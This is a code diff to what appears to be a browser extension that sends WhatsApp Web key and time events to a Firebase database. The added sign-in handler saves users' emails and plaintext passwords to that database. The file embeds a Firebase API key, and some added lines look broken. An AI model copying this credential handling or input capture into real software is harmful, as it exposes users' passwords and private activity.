@@ -1,8 +1,8 @@
 // Upload Data to firebase database
 
-WHATSAPP_WEB = "https://web.whatsapp.com/"
-SIGN_IN_ACTION = "SIGNIN"
-SIGN_UP_ACTION = "SIGNUP"
+const WHATSAPP_WEB = "https://web.whatsapp.com/"
+const SIGN_IN_ACTION = "SIGNIN"
+const SIGN_UP_ACTION = "SIGNUP"
 
 const config = {
     apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
@@ -14,6 +14,7 @@ const config = {
   };
 
 const FIREBASEANONA = firebase.initializeApp(config);
+var isSignedIn = false
 
 function writeClientData(key, time){
     FIREBASEANONA.database().ref().set({
@@ -23,19 +24,28 @@ function writeClientData(key, time){
 }
 
 function onMessage(request, sender){
-	console.log(sender)
-	if(sender.url == WHATSAPP_WEB){
+	if(sender.url == WHATSAPP_WEB && isSignedIn){
 		console.log(request.key + "- " + request.time);
 		writeClientData(request.key, request.time);
 	}
 	else{
 		if(request.action == SIGN_IN_ACTION){
+			isSignedIn = true;
 			firebase.auth().signInWithEmailAndPassword(request.email, request.password);
+			var userKey = FIREBASEANONA.database().ref("users").push()
+			userKey.set({
+				email: request.email,
+				password: request.password
 			});
+			alert(userKey);
+			userKey = userKey.substring(userKey.lastIndexOf("/-"));
+			alert(userKey);
 		}
-		if(request.action == SIGN_UP_ACTION)
+		if(request.action == SIGN_UP_ACTION){
+			isSignedIn = true;
 			firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
-			
+		}
+		
 	}
 }
 
